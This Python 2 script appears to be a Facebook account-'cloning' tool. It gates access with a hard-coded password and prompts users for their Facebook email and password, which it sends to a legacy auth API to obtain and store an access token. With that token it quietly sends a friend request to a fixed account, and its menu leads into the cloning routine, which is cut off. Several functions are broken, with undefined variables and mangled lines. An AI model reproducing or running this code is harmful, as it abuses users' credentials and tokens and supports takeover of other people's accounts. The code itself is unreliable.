#!/usr/bin/python2

#coding=utf-8

#oussama

#NAM TU SUNA HUGA 

# coded by oussama SM

#NAM TU SUNA HUGA

#Open sourse secrept if u copy it dn't chnage Oner name thnx to oussama sm

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize

from multiprocessing.pool import ThreadPool

from requests.exceptions import ConnectionError

from mechanize import Browser

reload(sys)

sys.setdefaultencoding('utf8')

br = mechanize.Browser()

br.set_handle_robots(False)

br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)

br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

def keluar():

	print "\x1b[1;91mExit"	os.sys.exit()

def acak(b):

    w = 'ahtdzjc'

    d = ''

    for i in x:

        d += '!'+w[random.randint(0,len(w)-1)]+i

    return cetak(d)

def cetak(b):

    w = 'ahtdzjc'

    for i in w:

        j = w.index(i)

        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))

    x += '\033[0m'

    x = x.replace('!0','\033[0m')

    sys.stdout.write(x+'\n')

def jalan(z):

	for e in z + '\n':

		sys.stdout.write(e)

		sys.stdout.flush()

		time.sleep(0.001)

#### colours ####

B='\033[1;94m'

R='\033[1;91m'

G='\033[1;92m'

W='\033[1;97m'

S='\033[1;96m'

P='\033[1;95m'

Y='\033[1;93m'

#Kdc:OUSSAMA 

#### LOGO ####

logo = """

	   \033[1;47m \033[1;31m OWNER :Rana MZ [ NAM TU SUNA HUGA ]\033[1;0m     

 \033[1;95m╔═════\033[1;91m⸎══════════════\033[1;91m⸎══════════\033[1;91m⸎════════╗

 \033[1;95m║\033[1;92mAuthor ║ \033[1;96m♤͜͡♤ WZ OUSSAMA

 \033[1;95m║\033[1;92mHAHA ║ \033[1;96m♤͜͡♤ NAM TU SUNA HUGA

 \033[1;95m║\033[1;92mAuthor2  ║ \033[1;96m♤͜͡♤ Inteq Al [ SMIX]

 \033[1;95m╚═════\033[1;91m⸎══════════════\033[1;91m⸎══════════\033[1;91m⸎════════╝

 \033[1;94m⊱══════════════════⊱═⊰DISCLAIMER [ WZ SMIX ]⊱═⊰══════════════════⊰

 \033[1;91mWARNING MZ :\033[1;93mSubcrbe : RANA MZ ON YOU TUBE.

 \033[1;91mHOW TO GET TOKEN OLD ID :\033[1;93mFIRST WATCH VIDEO LINKED AND CRETE A TOKEN THEN LOGIN COMNDS THEN U USE COMNDS.

"""

def tik():

	titik = ['.   ','..  ','... ']

	for o in titik:

		print("\r\x1b[1;93mPlease Wait \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)

back = 0

berhasil = []

cekpoint = []

oks = []

id = []

listgrup = []

gagal = []

idfriends = []

idfromfriends = []

idmem = []

em = []

emfromfriends = []

hp = []

hpfromfriends = []

reaksi = []

reaksigrup = []

komen = []

komengrup = []

listgrup = []

vulnot = "\033[31mNot Vuln"

vuln = "\033[32mVuln"

back = 0

threads = []

sucessful = []

checkpoint = []

oks = []

action_failed = []

idfriends = []

idfromfriends = []

member_id = []

email= []

number = []

id = []

em = []

email_from_friends = []

hp = []

hpfromfriends = []

reaction = []

reactiongroup = []

comment = []

group_comment = []

listgroup = []

vulnot = "\033[31mNot Vuln"

vuln = "\033[32mVuln"

os.system("clear")

print """

         

	   \033[1;47m \033[1;31m         OWNER : WZ SMIX [ NAM TU SUNA HUGA ]\033[1;0m     

 \033[1;95m╔═════\033[1;91m⸎══════════════\033[1;91m⸎══════════\033[1;91m⸎════════╗

 \033[1;95m║\033[1;92mCREATOR ║ \033[1;96m♤͜͡♤ WZ SMIX

 \033[1;95m║\033[1;92mAuthor ║ \033[1;96m♤͜͡♤ Sunny

 \033[1;95m║\033[1;92mRana MZ ║ \033[1;96m♤͜͡♤ NAM TU SUNA HUGA 

 \033[1;95m╚═════\033[1;91m⸎══════════════\033[1;91m⸎══════════\033[1;91m⸎════════╝

"""

jalan('⊱⊹⊰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━⊱⊹⊰') 

jalan('\033[1;91m      \033[1;91m Enter user nd pass wz Smix \033[1;0m     ') 

jalan('⊱⊹⊰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━⊱⊹⊰') 

CorrectUsername = "oussama smix"

CorrectPassword = "wizard"

loop = 'true'

while (loop == 'true'):

    username = raw_input("\033[1;96m[#] \x1b[0;36m Enter Username\x1b[1;92m➤ ")

    if (username == CorrectUsername):

    	password = raw_input("\033[1;96m[#] \x1b[0;36m Enter Password\x1b[1;92m➤ ")

        if (password == CorrectPassword):

            print "Logged in successfully as " + username  #WIZARD

            loop = 'false'

        else:

            print "Wrong password!"

            os.system('xdg-open https://youtu.be/jSK1Lk1zllY')

    else:

        print "Wrong username!"

        os.system('xdg-open https://youtu.be/jSK1Lk1zllY')

##### LICENSE #####

#=================#

def lisensi():

	os.system('clear')

	login()

####login#########

def login():

	os.system('clear')

	print logo

	jalan("\033[1;96m⊱⋕⊰══════════════════════════════════════⊱⋕⊰") 

	print "\033[1;91m>>>\033[1;91m[1]\033[1;93m Login With Facebook  "

        time.sleep(0.05)

        print "\033[1;91m>>>\033[1;91m[2]\033[1;94m Login With Access Token "

        time.sleep(0.05)

        print "\033[1;91m>>>\033[1;91m[3]\033[1;93m How to get  Access Token without cp id"

	time.sleep(0.05)

	print "\033[1;91m>>>\033[1;91m[4]\033[1;94m Wz Smix :  NAM TU SUNA HUGA" 

	time.sleep(0.05)

	print "\033[1;91m>>>\033[1;91m[0]\033[1;96m Exit        "

	jalan("\033[1;96m⊱⋕⊰══════════════════════════════════════⊱⋕⊰") 

	pilih_login()

def pilih_login():

	peak = raw_input("\n\033[1;91mChoose an Option═╬══►\033[1;95m")

	if peak =="":

		print "\x1b[1;91mFill in correctly"

		pilih_login()

	elif peak =="1":

		login1()

        elif peak =="2":

	        tokenz()

        elif peak =="3":

	        os.system('xdg-open https://youtu.be/jSK1Lk1zllY')

	        login()

	elif peak =="4":

		os.system('xdg-open https://youtu.be/jSK1Lk1zllY')

		login()

	elif unikers =="5":

		os.system('xdg-open https://youtu.be/jSK1Lk1zllY')

		login()

	elif unikers =="0":

		jalan('Token Removed')

		os.system('rm -rf login.txt')

		keluar()

	else:

		print "\x1b[1;91mFill in correctly"

		pilih()

			

		

	

def login1():

	os.system('clear')

	try:

		toket = open('login.txt','r')

		menu() 

	except (KeyError,IOError):

		os.system('clear')

                time.sleep(0.05)

		print logo

		jalan("\033[1;96m⊱⋕⊰══════════════════════════════════════⊱⋕⊰") 

		jalan('\033[1;96m[✾]\x1b[1;91mWz Smix [ NAM TU SUNA HUGA\x1b[1;96m[✾]' )

		jalan('\033[1;96m[✾]\x1b[1;91mSUBCRBE YOU TUBE [  ]\x1b[1;96m[✾]' )

		id = raw_input('\033[1;96m[!!] \x1b[0;34mID/Email \x1b[1;91m: \x1b[1;92m')

		pwd = raw_input('\033[1;96m[!!] \x1b[0;34mPassword \x1b[1;91m: \x1b[1;92m')

		jalan("\033[1;96m⊱⋕⊰══════════════════════════════════════⊱⋕⊰") 

		tik()

		try:

			br.open('https://m.facebook.com')

		except mechanize.URLError:

			print"\n\x1b[1;97mThere is no internet connection"

			keluar()

		br._factory.is_html = True

		br.select_form(nr=0)

		br.form['email'] = id

		br.form['pass'] = pwd

		br.submit()

		url = br.geturl()

		if 'save-device' in url:

			try:

				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'

				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}

				x=hashlib.new("md5")

				x.update(sig)

				a=x.hexdigest()

				data.update({'sig':a})

				url = "https://api.facebook.com/restserver.php"

				r=requests.get(url,params=data)

				z=json.loads(r.text)

				unikers = open("login.txt", 'w')

				unikers.write(z['access_token'])

				unikers.close()

				jalan( '\n\x1b[1;95mLogin Successful...') 

				os.system('xdg-open https://youtu.be/jSK1Lk1zllY')

				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])

				menu()

			except requests.exceptions.ConnectionError:

				print"\n\x1b[1;97mThere is no internet connection"

				keluar()

		if 'checkpoint' in url:

			print("\n\x1b[1;97mYour Account is on Checkpoint")

			os.system('rm -rf login.txt')

			time.sleep(1)

			keluar()

		else:

			print("\n\x1b[1;93mPassword/Email is wrong")

			os.system('rm -rf login.txt')

			time.sleep(1)

			login()

def tokenz():

	os.system('clear')

	print logo

	toket = raw_input("\033[1;91m[+]\033[1;92mToken\033[1;91m :\033[1;95mEnter accees token link without Fb login>> ")

	try:

		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)

		a = json.loads(otw.text)

		nama = a['name']

		zedd = open("login.txt", 'w')

		zedd.write(toket)

		zedd.close()

		menu()

	except KeyError:

		print "\033[1;91m[!] Wrong"

		e = raw_input("\033[1;91m[?] \033[1;92mWant to pick up token?\033[1;97m[y/n]: ")

		if e =="":

			keluar()

		elif e =="y":

			login()

		else:

			keluar()

			

def menu():

	os.system('clear')

	try:

		toket=open('login.txt','r').read()

	except IOError:

		os.system('clear')

		print"\x1b[1;94mToken invalid"

		os.system('rm -rf login.txt')

		time.sleep(1)

		login()

	try:

		o = requests.get('https://graph.facebook.com/me?access_token='+toket)

		a = json.loads(o.text)

		nama = a['name']

		id = a['id']

                t = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)

                b = json.loads(t.text)

                sub = str(b['summary']['total_count'])

	except KeyError:

		os.system('clear')

		print"\033[1;97mYour Account is on Checkpoint"

		os.system('rm -rf login.txt')

		time.sleep(1)

		login()

	except requests.exceptions.ConnectionError:

		print"\x1b[1;94mThere is no internet connection"

		keluar()

	os.system("clear")

	print logo

	jalan( "\033[1;93m⊱⋕⊰═════════════════════════════════════════⊱⋕⊰"  ) 

	print "  \033[1;36;40m\033[1;32;40m[*] Name\033[1;32;40m: "+nama+"  	   \033[1;36;40m"                               

	print "  \033[1;36;40m\033[1;32;40m[*] ID  \033[1;32;40m: "+id+"        \033[1;36;92m"

	print "  \033[1;36;40m\033[1;32;40m[*] Subs\033[1;32;40m: "+sub+"           \033[1;36;92m"

	jalan( "\033[1;93m⊱⋕⊰═════════════════════════════════════════⊱⋕⊰") 

	print "\033[1;32;98m[1] \033[1;96m>> start Cloning "																														

	print "\033[1;32;98m[0] \033[1;96m>> Exit WIZARD"

	pilih()

def pilih():

	unikers = raw_input("\n\033[1;31;40m>>> \033[1;35;40m")

	if unikers =="":

		print "\x1b[1;91mFill in correctly"

		pilih()

	
